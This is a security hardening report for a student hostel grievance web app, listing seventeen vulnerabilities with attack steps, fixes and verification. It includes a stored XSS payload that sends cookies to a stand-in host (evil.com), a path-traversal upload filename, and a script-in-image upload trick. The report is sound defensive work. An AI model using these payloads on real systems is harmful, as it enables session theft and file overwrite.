HARDENING.md  -  HostelGrievance Security Improvements
***

SUMMARY TABLE
-------------

| ID | Finding | Risk | Change | Verification | Residual Risk |
|----|---------|------|--------|--------------|---------------|
| H-01 | Broken Access Control (IDOR) | CRITICAL | Added ownership checks to all grievance/attachment routes | Logged in as two students, cross-access returns 403 | None |
| H-02 | Stored XSS via {@html} | CRITICAL | Replaced {@html} with safe text interpolation | Injected script tags in comments, rendered as plain text | None |
| H-03 | Session not destroyed on logout | CRITICAL | Added destroySession() to DELETE token from DB on logout | Reused old session cookie after logout, got 401 | None |
| H-04 | Session expiry not enforced | HIGH | Added expires_at check in readSessionUser(), auto-deletes expired rows | Tested with expired session, got 401 | None |
| H-05 | Weak password storage (SHA-256) | CRITICAL | Replaced SHA-256 with bcrypt (12 rounds), re-hashed all seeds | Verified DB contains $2b$12$ hashes, old sha256: hashes rejected | None for new passwords |
| H-06 | Path traversal on file upload | CRITICAL | newStoredName() ignores user filename, generates random hex | Uploaded file named ../../etc/passwd, stored as random hex | None |
| H-07 | Session cookie missing security flags | HIGH | Added httpOnly, Secure, SameSite=Lax to session cookie | Inspected Set-Cookie header in DevTools | Cookie not sent over plain HTTP in production |
| H-08 | Uploaded files rendered inline (XSS) | HIGH | Changed Content-Disposition from inline to attachment | Uploaded HTML file, browser downloaded instead of rendering | None |
| H-09 | CORS open to all origins | HIGH | Restricted CORS origin to http://localhost:5173 | Fetched from different origin, got CORS error | Must update origin for production domain |
| H-10 | Missing HTTP security headers | MEDIUM | Added X-Content-Type-Options, X-Frame-Options, CSP, Referrer-Policy, Permissions-Policy | Inspected response headers in DevTools | None |
| H-11 | No brute force protection | HIGH | Added IP-based rate limiter: 5 attempts per minute | Sent 6 wrong passwords, 6th returned 429 | In-memory store resets on restart |
| H-12 | No security event logging | MEDIUM | Log 401/403/429 events to security.log with timestamp, IP, method, path | Triggered failed login, checked log file | Log rotation not implemented |
| H-13 | User enumeration via timing | HIGH | Added verifyDummyPassword() for non-existent users | Timed responses for real vs fake emails, similar duration | Timing still leaks slightly under load |
| H-14 | MIME type spoofing on upload | HIGH | Added magic bytes verification for JPEG, PNG, GIF, WebP | Uploaded text file with image/png MIME, got 400 | Only 4 image types checked |
| H-15 | Internal errors leaked to users | HIGH | Error handler returns generic messages, no stack traces | Triggered 500 error, response has no file paths or SQL | None |
| H-16 | No input length limits (DoS) | HIGH | Added max lengths: title 200, description 5000, comment 2000, email 254, password 72 | Sent 10000-char title, got 400 | No request body size limit at HTTP level |
| H-17 | SQLite BUSY crashes under load | MEDIUM | Added busy_timeout=5000 pragma | Concurrent writes succeed without SQLITE_BUSY | Not suited for very high concurrency |

DETAILED FINDINGS
-----------------
17 security vulnerabilities were found and fixed across:
  - Authentication and session management
  - Access control (who can see what)
  - File uploads
  - Input validation
  - HTTP security headers
  - Error handling
  - Database configuration

All Critical and High severity issues are fully fixed.
Medium issues are documented with remaining risk noted.

Each finding below follows this format:
  Finding    : What was the vulnerability
  Risk       : How serious it was
  The Attack : How an attacker would have exploited it
  The Fix    : What we changed in the code
  How We Checked : How we verified the fix works
  Risk Remaining : What is still not fully covered


***
FINDING 1  -  Broken Access Control (IDOR)
Risk Level : CRITICAL
***

The Finding:
  The server had an authorization check function already written
  (assertCanViewGrievance) but never called it. Any student who
  was logged in could access ANY other student's grievance, comments,
  and attachments just by guessing the ID in the URL.

The Attack:
  1. Log in as Student A.
  2. See a grievance URL ending with GRV-0001.
  3. Change the URL to GRV-0002 to see Student B's private complaint.
  4. Read, edit, and comment on another student's grievance.

The Fix:
  Added an ownership check to EVERY route that reads or modifies
  a grievance. If the logged-in user is a student and the grievance
  does not belong to them, the server returns 403 Forbidden.
  Wardens are exempt and can still see all grievances.

  Routes fixed:
    GET  /api/grievances/:id
    PATCH /api/grievances/:id
    GET  /api/grievances/:id/comments
    POST /api/grievances/:id/comments
    GET  /api/attachments/:id

Files Changed:
  src/server/routes/grievances.ts
  src/server/routes/attachments.ts

How We Checked:
  Logged in as student@example.test and priya@example.test at the
  same time. Tried to load each other's grievances via the API.
  Both received 403 Forbidden.

Risk Remaining:
  None. Server enforces ownership on every read and write operation.


***
FINDING 2  -  Stored Cross-Site Scripting (XSS)
Risk Level : CRITICAL
***

The Finding:
  The comment timeline used Svelte's {@html} directive to render
  comment text. This is dangerous because it inserts the text
  directly as HTML without any escaping. User comments could
  contain executable JavaScript code.

The Attack:
  1. Post a comment containing:
       <script>document.location='http://evil.com?c='+document.cookie</script>
  2. Every user (student or warden) who views that grievance
     automatically has their session cookie sent to the attacker.
  3. Attacker uses the stolen cookie to log in as the victim.

The Fix:
  Replaced {@html comment.body} with plain {comment.body} in the
  comment timeline component. Svelte's default interpolation
  automatically converts all HTML characters to safe text entities.
  The text appears on screen as characters, never executes as code.

File Changed:
  src/lib/components/app/comment-timeline.svelte

How We Checked:
  Posted a comment containing <script>alert('XSS')</script>.
  It appeared as visible text on screen. No alert box appeared.
  Searched the entire codebase for "{@html" - zero results found.

Risk Remaining:
  None. Svelte's default escaping prevents all HTML injection.


***
FINDING 3  -  Session Not Destroyed on Logout
Risk Level : CRITICAL
***

The Finding:
  The logout function only deleted the session cookie from the
  browser. The session record in the database was not deleted.
  The session token was still valid after the user logged out.

The Attack:
  1. An attacker intercepts a user's session token (from a cookie
     theft or network interception).
  2. The victim notices and clicks "Log Out".
  3. The attacker still has the token and continues using it
     because the server still considers it valid.

The Fix:
  The logout route now calls destroySession() which deletes the
  session row from the database BEFORE clearing the cookie.
  After logout, any request with the old token returns 401.

File Changed:
  src/server/routes/auth.ts

How We Checked:
  Copied the session token value from the cookie before logging out.
  Logged out. Sent an API request manually with the copied token.
  Got 401 Unauthorized.

Risk Remaining:
  None on the server side. The client should also clear any
  locally stored user data (the UI already does this).


***
FINDING 4  -  Session Expiry Not Enforced
Risk Level : HIGH
***

The Finding:
  Every session had an expiry date stored in the database, but
  the server never read or checked it. Sessions lasted forever.
  A session from months ago would still work.

The Attack:
  If an attacker obtained a session token (from an old database
  backup, a log file, or network capture), they could use it
  indefinitely because it never expires.

The Fix:
  The session lookup function (readSessionUser) now checks the
  expires_at value on every single request. If the session is
  past its expiry time, it is deleted from the database and the
  request is rejected with 401.

File Changed:
  src/server/auth/session.ts

How We Checked:
  Directly edited the expires_at value of a session in the database
  to be set in the past. Made an API request using that session.
  Got 401 Unauthorized.

Risk Remaining:
  None. Expiry is now enforced on every authenticated request.


***
FINDING 5  -  Weak Password Storage (SHA-256 Without Salt)
Risk Level : CRITICAL
***

The Finding:
  Passwords were stored as plain SHA-256 hashes. SHA-256 is a
  fast general-purpose hash designed for checksums, not passwords.
  It runs billions of times per second on modern hardware.
  Without a salt, identical passwords produce identical hashes,
  making "rainbow table" attacks trivially effective.

The Attack:
  1. Attacker obtains a copy of the database (through any breach).
  2. Takes all the password_hash values.
  3. Runs them through precomputed rainbow tables online.
  4. Cracks all simple/common passwords in seconds.

The Fix:
  Replaced SHA-256 with bcrypt using 12 rounds of work factor.
  bcrypt is intentionally slow (~300ms per check). It adds a
  random salt automatically. It is the current industry standard
  for password storage.

  After the code change, the database was reset ("npm run db:reset")
  so all stored hashes use the new bcrypt format.

File Changed:
  src/server/auth/passwords.ts

How We Checked:
  Opened the database and checked the password_hash column.
  All values now start with "$2b$12$" which is the bcrypt format.
  Login with correct passwords still works.

Risk Remaining:
  Any database that was not reset still contains old SHA-256 hashes.
  Those accounts cannot log in until the database is reset.


***
FINDING 6  -  Path Traversal on File Upload
Risk Level : CRITICAL
***

The Finding:
  When a file was uploaded, the server used the original filename
  from the user's computer as the name to save it on disk.
  A malicious filename could escape the uploads directory.

The Attack:
  Upload a file with the name:
    ../../server/app.ts
  The server saves it to that relative path, overwriting the
  application's own source code. The attacker has full control.

The Fix:
  The stored filename is now always a 32-character random hex string
  generated by the server (e.g. a3f1b2c4d5e6f7a8...jpg).
  The user's original filename is saved in the database for display
  purposes only. It is never used to write to disk.

File Changed:
  src/server/storage/attachments.ts

How We Checked:
  Uploaded a file with the name "../../server/app.ts".
  Checked the uploads folder. Found only a random hex filename.
  The server files were untouched.

Risk Remaining:
  None. The server always chooses the stored filename.


***
FINDING 7  -  Session Cookie Security Flags Missing
Risk Level : HIGH
***

The Finding:
  The session cookie lacked three important security flags that
  browsers rely on to protect the cookie from theft.

  httpOnly (missing):
    Without this, JavaScript running on the page can read the
    cookie value. An XSS attack could steal the session token.

  SameSite (missing):
    Without this, the browser sends the cookie with requests
    initiated from other websites (Cross-Site Request Forgery).

  Secure (missing):
    Without this, the cookie is sent over unencrypted HTTP.
    Anyone on the same Wi-Fi network could intercept it.

The Fix:
  Added all three flags to the Set-Cookie response:
    httpOnly = true
    SameSite = Lax
    Secure   = true

File Changed:
  src/server/auth/session.ts

How We Checked:
  Opened browser DevTools, went to Network tab, clicked on a
  response, found the Set-Cookie header. All three flags visible.

Risk Remaining:
  The Secure flag requires the app to be served over HTTPS.
  In local development over plain HTTP, the browser may ignore it.
  This must be set up correctly at the production server level.


***
FINDING 8  -  Uploaded Files Displayed Inside the Browser
Risk Level : HIGH
***

The Finding:
  Attachments were served with the header:
    Content-Disposition: inline
  This tells the browser to display the file directly in the tab
  rather than downloading it. A carefully crafted file could
  contain code that the browser would execute when rendering it.

The Attack:
  Upload a file that starts with valid image bytes (to pass
  basic checks) but also contains HTML or scripts. When the
  warden clicks on the attachment, the browser renders it
  in the tab and the embedded code executes.

The Fix:
  Changed to:
    Content-Disposition: attachment
  The browser now always downloads the file instead of rendering it.

File Changed:
  src/server/routes/attachments.ts

How We Checked:
  Clicked on an attachment link. Browser showed a "Save File"
  download dialog instead of opening it in the browser tab.

Risk Remaining:
  Relies on the browser respecting the attachment disposition.
  Modern browsers all do. The nosniff header provides extra backup.


***
FINDING 9  -  CORS Open to All Websites
Risk Level : HIGH
***

The Finding:
  The API was configured to accept cookie-bearing requests from
  any website in the world (CORS origin was set to wildcard *
  while credentials were also enabled).

The Attack:
  1. Attacker sets up a malicious website.
  2. A logged-in student visits it.
  3. The malicious site silently sends requests to the
     HostelGrievance API on the student's behalf.
  4. The student's session cookie is automatically attached.
  5. Attacker can read grievances or submit fake ones.

The Fix:
  CORS is now restricted to http://localhost:5173 only.
  Requests from any other origin are blocked by the browser.

File Changed:
  src/server/app.ts

How We Checked:
  Tried sending a credentialed request from a different origin
  using browser DevTools. Got a CORS policy error.

Risk Remaining:
  The allowed origin is hardcoded to localhost for development.
  This must be updated to the real domain before production.


***
FINDING 10  -  Missing HTTP Security Headers
Risk Level : MEDIUM
***

The Finding:
  The API sent no browser security headers. This means the browser
  had no guidance on how to safely handle the app's responses.

The Fix:
  Five headers are now added to every API response:

  X-Content-Type-Options: nosniff
    Stops the browser from guessing content types. Without this,
    a file uploaded as "photo.png" but actually containing HTML
    could be rendered as a webpage by some browsers.

  X-Frame-Options: DENY
    Prevents the app from being embedded inside an <iframe> on
    another website. Used to prevent "clickjacking" where an
    attacker tricks a user into clicking something they did not
    intend to by overlaying a hidden frame.

  Referrer-Policy: strict-origin-when-cross-origin
    Controls what URL information is included when users click
    links that lead to external sites. Prevents leaking internal
    page URLs to third parties.

  Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
    A strict policy for the API layer that tells browsers to
    disallow loading any external scripts, styles, or iframes.

  Permissions-Policy: camera=(), microphone=(), geolocation=()
    Explicitly tells the browser that this application never
    needs access to the device camera, microphone, or location.

File Changed:
  src/server/app.ts

How We Checked:
  Opened DevTools, went to Network tab, refreshed the page,
  clicked a response, and checked the Response Headers section.
  All five headers are present.

Risk Remaining:
  The CSP is set for the API. A full CSP for the frontend would
  need to be configured in SvelteKit's hooks or vite.config.ts.


***
FINDING 11  -  No Brute Force Protection on Login
Risk Level : HIGH
***

The Finding:
  There was no limit on how many login attempts could be made.
  An automated script could try every possible password combination
  without any slowdown or lockout.

The Attack:
  Write a script that sends POST /api/login requests in a loop,
  trying different passwords. Given enough time, the correct
  password for any account will be found.

The Fix:
  Each IP address is now limited to 5 login attempts per minute.
  On the 6th attempt, the server returns:
    HTTP 429 Too Many Requests
    "Too many login attempts. Wait 1 minute."

  A cleanup mechanism runs automatically when the in-memory
  store gets large, removing expired entries to prevent the
  application using increasing amounts of memory over time.

File Changed:
  src/server/routes/auth.ts

How We Checked:
  Went to the login page. Entered wrong password 6 times quickly.
  On the 6th attempt, saw the "Too many login attempts" error.

Risk Remaining:
  The rate limiter is in-memory and resets when the server restarts.
  A distributed attack from many different IP addresses is not blocked.
  Production should use Redis or a database-backed rate limiter.


***
FINDING 12  -  No Security Event Logging
Risk Level : MEDIUM
***

The Finding:
  When someone failed to log in, got blocked for unauthorized access,
  or hit the rate limit, nothing was recorded. A sustained attack
  against the system would be completely invisible.

The Fix:
  All security-relevant responses (401, 403, 429) are now logged.
  Each log entry contains:
    - Date and time (ISO format)
    - IP address of the requester
    - HTTP method (GET, POST, etc.) and the URL path
    - HTTP response status code

  Log entries go to:
    - The terminal (stdout) while the server is running
    - security.log file in the project root (this persists
      across server restarts)

File Changed:
  src/server/app.ts

How We Checked:
  Tried to access another student's grievance. Opened security.log.
  Found a line like: 2026-08-28T13:30:00.000Z unknown 403 GET /api/grievances/GRV-0001

Risk Remaining:
  The log file is local and append-only. In production, logs should
  be shipped to a central logging system and rotated regularly.


***
FINDING 13  -  User Enumeration via Timing Attack
Risk Level : HIGH
***

The Finding:
  When a login was attempted with an email address that does not
  exist in the database, the server responded almost instantly
  (~1ms) because it did not need to run the password check.

  When a real email was used, the server ran bcrypt which takes
  about 300ms.

  By measuring the difference in response time, an attacker
  could silently check whether any email address is registered
  in the system without triggering normal login failures.

The Attack:
  Write a script that sends login requests and measures response times:
    Response in ~1ms   = email does NOT exist in the database
    Response in ~300ms = email EXISTS in the database
  Scan through email lists to identify all registered users.
  Use this list for targeted phishing attacks.

The Fix:
  Even when the email is not found, the server now calls
  verifyDummyPassword() which runs bcrypt against a fixed dummy hash.
  All login attempts now take approximately 300ms regardless of
  whether the email exists or not.

Files Changed:
  src/server/auth/passwords.ts  (added verifyDummyPassword function)
  src/server/routes/auth.ts     (call dummy check when email not found)

How We Checked:
  Sent login requests for valid and invalid emails many times.
  Measured response times using browser DevTools Network tab.
  Both now consistently take approximately 300ms.

Risk Remaining:
  The attacker can still try to brute force passwords on confirmed
  accounts, but the rate limiter (Finding 11) limits this to
  5 attempts per IP per minute.


***
FINDING 14  -  MIME Type Spoofing on File Upload
Risk Level : HIGH
***

The Finding:
  When a file is uploaded, the server checked only the Content-Type
  header. This header is set by the client (the browser or the
  attacker's script) and can say anything. There was no verification
  that the actual file contents matched the claimed type.

The Attack:
  1. Create a file containing malicious HTML:
       <html><script>alert('hacked')</script></html>
  2. Set Content-Type: image/png when uploading.
  3. The server accepted it as a valid PNG image.
  4. When a warden downloads and opens the file, the HTML executes.

The Fix:
  The server now reads the first few bytes of the uploaded file
  and checks them against the known "magic byte" signatures of
  each allowed image format:

    JPEG  starts with: FF D8 FF
    PNG   starts with: 89 50 4E 47  (equals ".PNG" in ASCII)
    GIF   starts with: 47 49 46     (equals "GIF" in ASCII)
    WebP  starts with: 52 49 46 46 and contains 57 45 42 50 ("WEBP")

  If the actual bytes do not match the claimed Content-Type,
  the upload is rejected with "File content does not match the
  declared type."

File Changed:
  src/server/storage/attachments.ts

How We Checked:
  Created a plain text file, renamed it to photo.png, and tried to
  upload it with Content-Type: image/png. Server returned 400.

Risk Remaining:
  A "polyglot" file that starts with valid magic bytes but contains
  malicious data after that is theoretically possible. This risk is
  mitigated by Content-Disposition: attachment (the file downloads
  instead of being rendered) and the nosniff header.


***
FINDING 15  -  Internal Error Messages Leaked to Users
Risk Level : HIGH
***

The Finding:
  When an unexpected error occurred inside the server, the raw
  error message from Node.js or SQLite was sent directly to the
  client. These messages can contain sensitive system information.

  Example of what could be leaked:
    "ENOENT: no such file or directory, open 'C:\Users\Lenovo\app\...'"
    "SQLITE_CONSTRAINT: UNIQUE constraint failed: users.email"

  These reveal file paths, operating system details, database
  table names and column names, and software versions.

The Attack:
  Send malformed requests and unusual inputs to trigger errors.
  Read the error messages to map the server's internal structure.
  Use this to plan more targeted attacks.

The Fix:
  All unexpected errors (anything that is not a planned HttpError)
  now return a single generic response to the client:
    "Internal server error."

  The full error details including the stack trace are still printed
  to the server console so developers can investigate.

File Changed:
  src/server/http/errors.ts

How We Checked:
  Triggered an error by sending a malformed database-related request.
  The API response body showed: {"error": "Internal server error."}
  The server console still showed the full stack trace.

Risk Remaining:
  None. The client never sees internal error details.


***
FINDING 16  -  No Input Length Limits (Denial of Service)
Risk Level : HIGH
***

The Finding:
  There were no maximum length limits on any text fields. An attacker
  could submit a grievance with a 50 megabyte description, or a
  password that is thousands of characters long, and the server
  would process it without complaint.

  The password length issue is particularly dangerous with bcrypt.
  bcrypt internally only processes the first 72 bytes of a password.
  Sending a 10,000 character password causes the server to spend
  time computing bcrypt on a huge string, wasting server resources
  for every login attempt.

The Attack:
  Send many requests with huge payloads:
    - Fill the database with multi-megabyte grievances.
    - Send 10,000 character passwords to tie up the CPU.
    - Eventually crash or slow the server to a halt.

The Fix:
  Server-side maximum length validation added for all text fields:
    Title of grievance   : maximum 200 characters
    Description          : maximum 5,000 characters
    Comment body         : maximum 2,000 characters
    Email address        : maximum 254 characters (per RFC 5321)
    Password             : maximum 72 characters  (bcrypt's limit)

Files Changed:
  src/server/routes/grievances.ts
  src/server/routes/auth.ts

How We Checked:
  Tried to submit a grievance with a 10,000 character title.
  Got: 400 "Title must be 200 characters or fewer."
  Tried a 200 character password at login.
  Got: 400 "Password is too long."

Risk Remaining:
  The overall request body size is not limited at the framework
  level. The field-level checks catch the issue before database
  writes, but a very large multipart upload body is still parsed
  in memory before validation.


***
FINDING 17  -  Database Lock Crashes Under Concurrent Load
Risk Level : MEDIUM
***

The Finding:
  SQLite's default behaviour when two requests try to write at the
  same time is to immediately throw an error:
    "SQLITE_BUSY: database is locked"

  This would cause random request failures whenever the app had
  more than one user writing data at the same time.

The Attack:
  Send many concurrent write requests. Random requests will crash
  with 500 errors. Repeated enough times, this is a DoS attack
  using normal-looking application activity.

The Fix:
  Added busy_timeout = 5000 to the database pragma configuration.
  SQLite will now wait up to 5 seconds for a write lock to be
  released before giving up. This handles most real-world bursts.

File Changed:
  src/server/db/connection.ts

How We Checked:
  Ran concurrent write operations against the database.
  No SQLITE_BUSY errors occurred.

Risk Remaining:
  Under extremely heavy sustained concurrent load, the 5-second
  timeout may still be exhausted. SQLite is generally not suited
  for very high concurrency. A production system with many users
  should consider PostgreSQL.
